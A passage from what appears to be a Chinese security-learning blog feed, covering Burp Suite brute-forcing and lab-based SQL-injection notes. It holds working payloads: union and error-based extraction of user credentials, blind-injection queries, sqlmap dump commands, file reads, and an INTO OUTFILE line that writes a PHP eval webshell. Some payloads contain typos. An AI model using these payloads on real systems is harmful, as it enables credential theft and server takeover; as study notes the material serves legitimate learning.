class="line">2.暴力破解方式</span><br><span class="line">在线方式</span><br><span class="line">离线方式</span><br><span class="line">破解成功取决于字典是否强大，以及本地机器与服务器性能、带宽限制等因素。</span><br><span class="line"></span><br><span class="line">3.使用Burpsuite进行暴力破解</span><br><span class="line">判断依据：登录成功与失败返回的HTML内容不同，大小不同，根据大小不同选出唯一的内容。</span><br></pre></td></tr></table></figure><h2 id="暴力破解表单内容"><a href="#暴力破解表单内容" class="headerlink" title="暴力破解表单内容"></a>暴力破解表单内容</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1.HTML表单</span><br><span class="line">表单是一个包含表单元素的区域。</span><br><span class="line">表单元素是允许用户在表单中输入内容，如文本域、下拉列表、单选框、复选框等。</span><br><span class="line"></span><br><span class="line">2.暴力破解POST提交数据</span><br><span class="line">在登录页面经常使用POST方式提交数据。通过Burpsuite对POST提交的数据进行暴力破解。</span><br><span class="line"></span><br><span class="line">3.暴力破解验证码</span><br></pre></td></tr></table></figure><h2 id="HTTP-basic认证"><a href="#HTTP-basic认证" class="headerlink" title="HTTP basic认证"></a>HTTP basic认证</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">1.HTTP basic认证</span><br><span class="line">基本认证 basic authorizcation,是http1.0提出的认证方法。</span><br><span class="line"></span><br><span class="line">基本认证步骤：</span><br><span class="line">(1)服务端访问一个受http基本认证保护的资源</span><br><span class="line">(2)服务器返回401状态，要求客户端提供用户名和密码进行认证</span><br><span class="line">(3)客户端将输入的用户名密码用base64进行编码后，采用非加密明文方式发送给服务器</span><br><span class="line">(4)如果认证成功，则返回相应的资源。如果认证失败，则返回401状态，要求进行重新认证</span><br><span class="line"></span><br><span class="line">2.burpsuite分析认证过程</span><br><span class="line">使用Burpsuite对HTTP Basic认证进行抓包分析</span><br><span class="line">Authorizcation：Basic xxxxxx（base64加密后的用户名和密码）</span><br><span class="line"></span><br><span class="line">3.暴力破解burpsuite认证</span><br><span class="line">使用Burpsuite对目标进行暴力破解。</span><br><span class="line">在intruder里，选中base64加密后的用户名密码，add添加，选中payload；</span><br><span class="line">在payload processing里选中添加encode规则，选中base64，开始暴力破解。</span><br></pre></td></tr></table></figure><h2 id="HTTP-basic认证字典生成"><a href="#HTTP-basic认证字典生成" class="headerlink" title="HTTP basic认证字典生成"></a>HTTP basic认证字典生成</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.字典生成思路</span><br><span class="line">字典生成是针对具体目标生成，确定目标：username，passwd</span><br><span class="line">思路：</span><br><span class="line">读取字典文件内容；</span><br><span class="line">对读取来的文件内容进行拼接；</span><br><span class="line">将新生成的内容写入到最终字典文件中，要符合HTTP Basic认证。</span><br></pre></td></tr></table></figure><h2 id="Burpsuite设置HTTP认证"><a href="#Burpsuite设置HTTP认证" class="headerlink" title="Burpsuite设置HTTP认证"></a>Burpsuite设置HTTP认证</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.设置原因</span><br><span class="line">在web应用测试过程中，如果web设置了HTTP认证，就需要使用用户名、密码进行登录才能进行保护区域的资源访问。</span><br><span class="line"></span><br><span class="line">Burpsuite中提供了用于认证设置的功能模块可以设置HTTP认证需要的用户名、密码，方便测试。</span><br><span class="line">在useroptions在的Platform Authentication，点击add，填写destination host为目标ip，Authentication type选为Basic。</span><br></pre></td></tr></table></figure><h2 id="离线暴力破解"><a href="#离线暴力破解" class="headerlink" title="离线暴力破解"></a>离线暴力破解</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.离线破解</span><br><span class="line">离线破解：在破解过程中，已经获得加密密文，在不与目标服务器交互的情况下，利用在线网站或本地程序对密文进行破解。</span><br><span class="line"></span><br><span class="line">离线破解不会触发密码锁定机制；</span><br><span class="line">不会产生大量的登录失败日志引起注意。</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="web安全" scheme="http://yoursite.com/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="暴力破解" scheme="http://yoursite.com/tags/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入</title>
    <link href="http://yoursite.com/2020/08/01/SQL%E6%B3%A8%E5%85%A5/"/>
    <id>http://yoursite.com/2020/08/01/SQL注入/</id>
    <published>2020-08-01T14:36:48.000Z</published>
    <updated>2020-08-01T14:38:34.200Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h2 id="SQL注入原理"><a href="#SQL注入原理" class="headerlink" title="SQL注入原理"></a>SQL注入原理</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">语言分类：解释型语言和编译型语言</span><br><span class="line">解释型语言：在运行时边解释边执行的语言。</span><br><span class="line">编译型语言：代码一次编译，以后都可以直接执行。</span><br><span class="line"></span><br><span class="line">在解释型语言中，如果程序与用户进行交互。用户就可以构造特殊的输入来拼接到程序中执行，从而使得程序依据用户输入执行有可能存在恶意行为的代码。</span><br><span class="line"></span><br><span class="line">cms逻辑：</span><br><span class="line">index.php首页展示内容，具有文章列表（链接具有文章id）、artcles.php文章详细页，URL中article.php？id&#x3D;文章id读取id文章。</span><br><span class="line"></span><br><span class="line">SQL注入验证：</span><br><span class="line">‘单引号闭合字符串型</span><br><span class="line">and1&#x3D;1  and1&#x3D;2 闭合数字型</span><br></pre></td></tr></table></figure><h2 id="mysql注入知识"><a href="#mysql注入知识" class="headerlink" title="mysql注入知识"></a>mysql注入知识</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">1.Mysql5.x数据结构：</span><br><span class="line"></span><br><span class="line">在Mysql5.0及以上的版本中，为方便管理，默认定义了information_schema元数据库，用来存储数据库元信息。其中具有表schemata（数据库名）、tables（表名）、columns（列名或字段名）。</span><br><span class="line">在schemata表中，schema_name字段用来存储数据库名</span><br><span class="line">在tables表中，table_schema和table_name分别用来存储数据库名和表名</span><br><span class="line">在columns表中，table_schema（数据库名）、table_name（表名）、column_name（字段名）</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2.mysql增删改查</span><br><span class="line">SELECT 列名 from 表名  where 字段1&#x3D;’条件1‘ and 字段2&#x3D;’条件2‘</span><br><span class="line">INSERT INTO table_name（列1，列2。。）VALUES（值1，值2.。。。）</span><br><span class="line">UPDATE 表名称 SET 列名称&#x3D;新值  WHERE 列名称&#x3D;某值</span><br><span class="line">DELETE FROM  表名称 WHERE 列名称&#x3D;值</span><br><span class="line"></span><br><span class="line">显示数据库：show database；</span><br><span class="line">进入某一数据库：use 数据库名；</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">3.Mysql常用函数：</span><br><span class="line">mysql常用的聚合函数：</span><br><span class="line">user()：查看当前mysql登录用户名</span><br><span class="line">database()：查看当前使用的mysql数据库名</span><br><span class="line">version():查看当前mysql版本</span><br><span class="line"></span><br><span class="line">limlit关键字：</span><br><span class="line">limit m，n：从m行开始，到m+n行（走几行）。</span><br><span class="line"></span><br><span class="line">在mysql中常用的注释符：#或--空格或&#x2F;**&#x2F;</span><br><span class="line">空格的编码为%20</span><br><span class="line">内联注释：&#x2F;*！SQL语句*&#x2F;  只有MySQL可以识别，常用来绕WAF</span><br><span class="line">使用内联注释注入：select * from articles where id&#x3D;-1&#x2F;*!union*&#x2F;&#x2F;*!select *&#x2F;1,2,3,4</span><br></pre></td></tr></table></figure><h2 id="sqli注入靶场搭建"><a href="#sqli注入靶场搭建" class="headerlink" title="sqli注入靶场搭建"></a>sqli注入靶场搭建</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">1.phpstudy环境安装</span><br><span class="line">phpstudy是一个PHP调试环境的程序集成包。</span><br><span class="line">该程序包集成最新的Apache+PHP+Mysql+phpmyadmin+Zendoptimizer，一次性安装，无需配置即可使用，学习PHP只需一个集成包。</span><br><span class="line">下载地址：http:&#x2F;&#x2F;phpstudy.php.cn</span><br><span class="line"></span><br><span class="line">2.火狐浏览器插件</span><br><span class="line">火狐浏览器采用Gecko排版引擎，支持多种操作系统。</span><br><span class="line">安全方面的插件：</span><br><span class="line">hackbar、Firebug、Live http headers（查看请求响应的HTTP数据包）、Tamper data</span><br><span class="line"></span><br><span class="line">3.sqlmap安装</span><br><span class="line">sqlmap是一款强大的SQL注入漏洞检测和利用工具。官方网站：http:&#x2F;&#x2F;www.sqlmap.org&#x2F;</span><br><span class="line">sqlmap为python语言编写的工具。需要先安装python环境，安装时add to path添加到系统变量里。</span><br><span class="line"></span><br><span class="line">windows下搭建sqlmap:</span><br><span class="line">下载好程序，cd相应目录，python sqlmap.py即可启动</span><br><span class="line"></span><br><span class="line">4.sqli-Lab安装</span><br><span class="line">Sqli-labs是一个印度程序员写的，使用php进行编写的，用来练习sql注入的。</span><br><span class="line">下载：https:&#x2F;&#x2F;github.com&#x2F;Audi-1&#x2F;sqli-labs</span><br><span class="line">下载好打开sql-connection&#x2F;db-creds.inc，修改默认数据库连接密码。</span><br><span class="line">切换phpstudy至5.3版本可解决PDO剔除报错。</span><br></pre></td></tr></table></figure><h2 id="GET基于报错的SQL注入"><a href="#GET基于报错的SQL注入" class="headerlink" title="GET基于报错的SQL注入"></a>GET基于报错的SQL注入</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">1.SQL注入的分类</span><br><span class="line">根据注入位置数据类型可将SQL注入分为两类：数字型和字符型</span><br><span class="line">数字型：select * from table where id&#x3D;用户输入id</span><br><span class="line">字符型：select * from table where id&#x3D;&#39;用户输入的id&#39;</span><br><span class="line"></span><br><span class="line">通过在URL中修改对应的ID值，为正常数字、字符（单引号、双引号、单双引号、括号）、反斜杠\来探测URL中是否存在注入点。</span><br><span class="line">’单引号URL编码后为%27</span><br><span class="line"></span><br><span class="line">2.GET基于报错的SQL注入的发现</span><br><span class="line">id&#x3D;1‘   先让mysql报错，然后进行闭合：id&#x3D;1’）--+</span><br><span class="line">id&#x3D;1‘’  先让mysql报错，然后进行闭合：id&#x3D;1&#39;&#39;）--%20</span><br><span class="line"></span><br><span class="line">3.利用</span><br><span class="line">利用order by判断字段数</span><br><span class="line">注入位置分析：</span><br><span class="line">select username,passwd from admin where id&#x3D;&#39;id&#39; order by 10--+&#39; limit 0,1</span><br><span class="line"></span><br><span class="line">利用union select联合查询，获取表名</span><br><span class="line">0&#39; union select 1,group_concat(table_name),3 from information_schema.tables where </span><br><span class="line">table_schema&#x3D;database()--+</span><br><span class="line">0&#39;是为了让mysql报错，爆出可以利用的位置。</span><br><span class="line"></span><br><span class="line">利用union select联合查询，获取字段名</span><br><span class="line">0&#39; union select 1,group_conact(column_name),3 from information_schema.columns where table_name&#x3D;&#39;users&#39;--+</span><br><span class="line">利用union select联合查询，获取字段值</span><br><span class="line">0’ union select 1,group_conact(username,0x3a,passwd),3 from users--+</span><br><span class="line"></span><br><span class="line">4.sqlmap工具</span><br><span class="line">python sqlmap.py -u &#39;http:&#x2F;&#x2F;xxx.xxx.com&#x2F;?id&#x3D;1&#39; --dbs --batch</span><br><span class="line">-D:查询数据库</span><br><span class="line">-T:查询相应数据库的表</span><br><span class="line">--columns：查询相应表的字段</span><br></pre></td></tr></table></figure><h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">1.什么是盲注</span><br><span class="line">注入攻击的一种，向数据库发送true或false这样的问题，并根据应用程序返回的信息判断结果。这种攻击的出现是因为应用程序为只显示常规错误，并没有解决SQL注入存在的代码问题。</span><br><span class="line"></span><br><span class="line">当利用SQL注入进行攻击，web应用程序会显示，后端数据库SQL查询返回的错误信息。而若数据库没有输出数据到web界面，而通过询问一些列的true和false问题，强制从数据库获取数据。</span><br><span class="line"></span><br><span class="line">2.GET基于时间的盲注</span><br><span class="line">if(ascii(substr(database(),1,1)&#x3D;115,1,sleep(3)))</span><br><span class="line">当数据库名第一个字母的ascii码等于115时，执行一次sleep(3)函数等待3秒</span><br><span class="line">网页上检查元素，查看网络的返回时间。</span><br><span class="line"></span><br><span class="line">3.GET基于Boolean的盲注</span><br><span class="line">基于布尔型的盲注，通常采用下面方法猜解字符串：</span><br><span class="line">select length(database());</span><br><span class="line">select substr(database(),1,1);</span><br><span class="line">select ascii(substr(database(),1,1))&gt;N;</span><br><span class="line">select ascii(substr(database(),1,1))&#x3D;N;</span><br><span class="line">select ascii(substr(database(),1,1))&lt;N;</span><br><span class="line"></span><br><span class="line">4.使用sqlmap进行盲注</span><br><span class="line">时间盲注：</span><br><span class="line">python sqlmap.py -u &#39;xxx.xxx.com&#x2F;?id&#x3D;1&#39; --technique -T </span><br><span class="line">布尔盲注：</span><br><span class="line">python sqlmap.py -u &#39;xxx.xxx.com&#x2F;?id&#x3D;1&#39; --technique -B</span><br></pre></td></tr></table></figure><h2 id="mysql注入读写文件"><a href="#mysql注入读写文件" class="headerlink" title="mysql注入读写文件"></a>mysql注入读写文件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">1.mysql注入读文件</span><br><span class="line">读取前提：</span><br><span class="line">用户权限足够大，最好是root权限；</span><br><span class="line">secure_file_priv不为NULL</span><br><span class="line"></span><br><span class="line">使用方法：select load_file(’具体文件路径‘)</span><br><span class="line">因为联合查询只能输出一条，需要使其报错，出错位置表示可以在相应的位置查询数据。</span><br><span class="line">xxx.xxx.com&#x2F;?id&#x3D;-1&#39; union select 1,load_file(F:\\flag.txt),3 --+</span><br><span class="line"></span><br><span class="line">2.mysql注入写文件</span><br><span class="line">前提：</span><br><span class="line">权限允许写入</span><br><span class="line">set globle general_log &#x3D;on </span><br><span class="line"></span><br><span class="line">写入方法：into outfile ‘具体路径，要用双\\，因为mysql会对\进行转义’</span><br><span class="line">xxx.xxx.com&#x2F;?id&#x3D;-1&#39;)),1,&#39;&lt;?php phpinfo;?&gt;&#39;,3 into outfile &#39;E:\\phpstudy\\www\\sqli\\less7\\1.php&#39;--+</span><br><span class="line"></span><br><span class="line">3.写入webshell</span><br><span class="line">写入一句话木马，然后使用菜刀进行连接。</span><br><span class="line">xxx.xxx.com&#x2F;?id&#x3D;-1&#39;)) union select 1，&#39;&lt;?php @eval($_POST[&#39;x&#39;];？&gt;)&#39;,3  into outfile &#39;C:\\phpstudy\\php\\www\\sqli\\less7\\2.php&#39;--+</span><br><span class="line"></span><br><span class="line">4.使用sqlmap</span><br><span class="line">读文件：</span><br><span class="line">sqlmap -u &quot;xxx.xxx.com&#x2F;?id&#x3D;1&quot; --flie-read &quot;E:\\flag.txt&quot;</span><br><span class="line">写文件：</span><br><span class="line">sqlmap -u &quot;xxx.xxx.com&#x2F;?id&#x3D;1&quot; --file-write &quot;&#x2F;root&#x2F;1.php&quot; --file-dest &quot;F:\\1.php&quot;</span><br></pre></td></tr></table></figure><h2 id="POST时间与布尔盲注"><a href="#POST时间与布尔盲注" class="headerlink" title="POST时间与布尔盲注"></a>POST时间与布尔盲注</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">1.POST</span><br><span class="line">POST发送数据给服务器处理，数据包含HTTP信息正文中。</span><br><span class="line">POST请求会向指定资源提交数据，请求服务器进行处理，如表单数据、文件上传等，请求数据会被包含在请求体中。</span><br><span class="line">POST方法可能会创建新的资源和修改现有资源。</span><br><span class="line">使用POST方法时，查询字符串在POST信息中单独存在，和HTTP请求一起发送到服务器</span><br><span class="line">POST &#x2F;xxx.xxx.html HTTP&#x2F;1.1</span><br><span class="line">Host：xxx.xxx.com</span><br><span class="line"></span><br><span class="line">2.POST时间盲注</span><br><span class="line">在POST提交的参数后加and if(length(database())&gt;5,sleep(5),null)</span><br><span class="line">如果执行的页面响应时间大于5秒，则存在注入。</span><br><span class="line">例子：</span><br><span class="line">uname&#x3D;admin&#39; and（select(if(length(database())&gt;5,sleep(5),null))）--+ &amp;passwd&#x3D;1234&amp;submit&#x3D;submit</span><br><span class="line">可以观察到响应速度明显慢</span><br><span class="line"></span><br><span class="line">3.POST布尔盲注</span><br><span class="line">在存在注入点POST提交的参数后加入if判断正确或错误的语句。</span><br><span class="line">select length(database());</span><br><span class="line">select substr(database(),1,1);</span><br><span class="line">select ascii(substr(database(),1,1);</span><br><span class="line">select ascii(substr(database(),1,1))&gt;N;</span><br><span class="line">例子：</span><br><span class="line">uname&#x3D;admin&#39; and（length(database())&gt;5)--+ &amp;passwd&#x3D;1234</span><br></pre></td></tr></table></figure><h2 id="POST基于错误注入"><a href="#POST基于错误注入" class="headerlink" title="POST基于错误注入"></a>POST基于错误注入</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">1.Burpsuite抓取HTTP请求</span><br><span class="line">Burpsuite需要安装JAVA环境，同时在浏览器设置本机局域网代理。</span><br><span class="line"></span><br><span class="line">2.POST基于错误单引号注入</span><br><span class="line">在登录界面抓取用户名、密码后，点击send to repeter</span><br><span class="line">输入\使其报错，看报错内容，闭合前面并注释掉后面</span><br><span class="line">POST的内容为：uname&#x3D;admin&amp; passwd&#x3D;1234 &amp;submit&#x3D;submit</span><br><span class="line">注入为：uname&#x3D;admin &amp;passwd&#x3D;1234&#39; or 1&#x3D;1--+ &amp;submit&#x3D;submit</span><br><span class="line"></span><br><span class="line">3.POST基于错误双引号注入、</span><br><span class="line">输入\使其报错，看报错内容，闭合前面并注释后面</span><br><span class="line">POST内容为uname&#x3D;admin &amp;passwd&#x3D;1234 </span><br><span class="line">注入为: uname&#x3D;admin &amp;passwd&#x3D;1234&#39;&#39;) or 1&#x3D;1--+</span><br><span class="line"></span><br><span class="line">4.使用sqlmap POST注入</span><br><span class="line">方法：</span><br><span class="line">复制Burpsuite截断的HTTP请求数据包到文本文件中，使用sqlmap -r 文件路径 -p 指定探测参数</span><br><span class="line"></span><br><span class="line">python sqlmap.py -r test.txt -p passwd --technique E </span><br><span class="line">&#x2F;&#x2F;指定对passwd参数进行基于错误注入</span><br><span class="line">python sqlmap.py -r test.txt -p passwd --technique E --current-db</span><br><span class="line">&#x2F;&#x2F;查看当前使用的数据库名称</span><br><span class="line">python sqlmap.py -r test.txt -p passwd -D security --tables </span><br><span class="line">&#x2F;&#x2F;探测指定数据库的表</span><br><span class="line">python sqlmap.py -r test.txt -p passwd -D security -T user --columns </span><br><span class="line">&#x2F;&#x2F;探测user表中的字段</span><br><span class="line">pyhton sqlmap.py -r test.txt -p passwd -D security -T user -C &quot;username,passwd&quot; --dump</span><br><span class="line">&#x2F;&#x2F;探测指定字段username及passwd的内容</span><br></pre></td></tr></table></figure><h2 id="GET报错注入-双注入"><a href="#GET报错注入-双注入" class="headerlink" title="GET报错注入-双注入"></a>GET报错注入-双注入</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">1.GET报错注入</span><br><span class="line">报错注入形式上是两个嵌套的查询，即select....(select....)，里面的被称为子查询，顺序是先执行子查询，然后再执行外面的select。</span><br><span class="line">双注入主要涉及的函数：</span><br><span class="line">rand()随机函数，返回0-1之间的某个值</span><br><span class="line">floor(a)取整函数，返回小于等于a，且值最接近a的一个整数</span><br><span class="line">count()聚合函数也称作计数函数，返回查询对象的总数</span><br><span class="line">group by clause分组语句，按照查询结果分组</span><br><span class="line">通过报错来显示具体的信息</span><br><span class="line"></span><br><span class="line">查询的时候如果使用rand()的话，该值会被计算多次。在使用group by的时候，floor(rand(0)*2)会被执行一次，如果虚表不存在记录，插入虚表的时候会再被执行一次。在一次多记录的查询过程中，floor(rand(0)*2)的值是定性的，为011011</span><br><span class="line">payload示例：</span><br><span class="line">slect count(*) from table group by floor(rand(0)*2)</span><br><span class="line"></span><br><span class="line">2.GET单引号报错注入</span><br><span class="line">获取数据库：</span><br><span class="line">xxx.xxx.com&#x2F;?id&#x3D;-1&#39; union select 1,2,3 from (select count(*),concat((select conact(version(),0x3a,0x3a,database(),0x3a,0x3a,user(),0x3a)limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a --+</span><br><span class="line">获取表名：</span><br><span class="line">xxx.xxx.com?id&#x3D;-1&#39; union select 1,2,3 from (select count(*),concat((select conact(table_name,0x3a,0x3a)from information_schema.tables where table_schema&#x3D;database()limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a --+</span><br><span class="line">获取用户信息：</span><br><span class="line">xxx.xxx.com&#x2F;?id&#x3D;-1&#39; union select 1,2,3 from(select count(*),concat((select concat(usename,0x3a,0x3a,passwd,0x3a,0x3a)from security.users limit 1,1)floor(rand(0)*2))x from information_schema.tables group by x)a --+</span><br><span class="line"></span><br><span class="line">3.GET双引号报错注入</span><br><span class="line">与单引号报错注入的区别在于闭合双引号</span><br></pre></td></tr></table></figure><h2 id="HTTP头注入"><a href="#HTTP头注入" class="headerlink" title="HTTP头注入"></a>HTTP头注入</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">1.HTTP头注入</span><br><span class="line">对HTTP头的内容没有进行过滤，从而造成注入产生</span><br><span class="line"></span><br><span class="line">2.HTTP user-Agent注入</span><br><span class="line">程序代码：</span><br><span class="line">$insert&#x3D;&quot;INSERT INTO &#39;security&#39;.&#39;uagents&#39;(&#39;uagent&#39;,&#39;ip_address&#39;,&#39;username&#39;)VALUES(&#39;$uagent&#39;,&#39;$IP&#39;,$uname)&quot;;</span><br><span class="line"></span><br><span class="line">payload：</span><br><span class="line">updatexml(xml_document,xpath_string,new_value):</span><br><span class="line">第一个参数：XML文档对象名称</span><br><span class="line">第二个参数：XPath字符串</span><br><span class="line">第三个参数：替换查找到的符合条件的数据</span><br><span class="line">&#39;and updatexml(1,concat(0x7e,(select @@version),0x7e),1) or &#39;1&#39;&#x3D;&#39;1</span><br><span class="line"></span><br><span class="line">3.HTTP Referer注入</span><br><span class="line">注入位置在Referer</span><br><span class="line"></span><br><span class="line">4.使用sqlmap进行测试</span><br><span class="line">sqlmap-u &quot;xxx.xxx.com&#x2F;post.php&quot; --forms </span><br><span class="line">&#x2F;&#x2F;对POST表单提交的内容进行测试</span><br><span class="line">sqlmap -u &quot;xxx.xxx.com&#x2F;login.asp&quot; --data &quot;n&#x3D;1&amp;m&#x3D;1&quot;</span><br><span class="line">&#x2F;&#x2F;指定参数进行探测</span><br><span class="line"></span><br><span class="line">指定注入位置进行注入，在保存的文件中，将对应参数修改为 *</span><br><span class="line">sqlmap.py -r test.txt</span><br></pre></td></tr></table></figure><h2 id="注入绕过"><a href="#注入绕过" class="headerlink" title="注入绕过"></a>注入绕过</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">1.大小写绕过</span><br><span class="line">通过修改关键字内字母大小写来绕过过滤措施，如</span><br><span class="line">AnD 